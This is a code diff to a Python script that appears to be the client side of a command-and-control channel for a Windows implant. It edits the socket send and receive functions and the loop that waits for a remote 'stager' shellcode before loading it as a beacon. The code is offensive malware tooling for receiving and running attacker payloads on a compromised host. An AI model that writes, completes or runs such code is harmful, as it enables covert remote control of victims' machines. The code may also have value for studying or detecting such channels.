@@ -3,6 +3,7 @@ from ctypes.wintypes import *
 from time import sleep
 import sys
 import os
+import struct
 
 # Encoder imports:
 import base64
@@ -39,13 +40,16 @@ def prepTransport():
 
 def sendData(sock, data):
 	encoded_data = encode(data)
+	slen = struct.pack('<I', len(encoded_data))
+	sock.sendall(slen + encoded_data)
 
 	return 0
 
 def recvData(sock):
 	data = "" # TODO
-	sock.settimeout(SOCK_TIME_OUT)
-	newTask = sock.recv(1024)
+	# sock.settimeout(SOCK_TIME_OUT)
+	newTask = sock.recv(8126)
+	print "newTask = " + str(newTask) #DEBUG
 
 	decoded_task = decode(newTask)
 	return decoded_task
@@ -83,13 +87,14 @@ def WritePipe(hPipe,chunk):
 
 def go(sock):
 	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
-
+	print "Waiting for stager..." # DEBUG
 	p=""
 	# Wait for shellcode
 	while(len(p) <= 0):
+		print "Next chunk.."
 		sleep(0.3)
 		p = recvData(sock)
-	print "got a stager! loading!"
+	print "Got a stager! loading..."
 	sleep(2)
 	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
 	handle_beacon = start_beacon(p)
